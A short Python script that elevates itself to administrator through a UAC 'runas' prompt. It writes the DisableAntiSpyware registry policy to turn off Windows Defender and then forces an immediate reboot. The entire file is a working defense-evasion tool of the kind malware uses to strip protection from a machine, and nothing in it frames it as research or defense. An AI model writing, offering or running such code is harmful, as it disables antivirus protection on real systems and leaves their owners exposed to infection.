import winreg
import os
import sys
import ctypes

def is_admin():
    """ Check if the script is running with administrative privileges. """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except AttributeError:
        return False

def restart_computer():
    """ Restart the computer. """
    os.system("shutdown /r /t 0")

def modify_registry():
    """ Modify the registry to disable Windows Defender. """
    try:
        # Define the registry path and value
        reg_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        reg_name = "DisableAntiSpyware"
        reg_value = 1

        # Open or create the registry key
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
            # Set the DWORD value
            winreg.SetValueEx(key, reg_name, 0, winreg.REG_DWORD, reg_value)

        print("Registry modification completed. The computer will now restart.")
        restart_computer()

    except PermissionError:
        print("Permission denied. Please run this script as an administrator.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if is_admin():
        modify_registry()
    else:
        # Re-run the script with administrative privileges if not running as admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
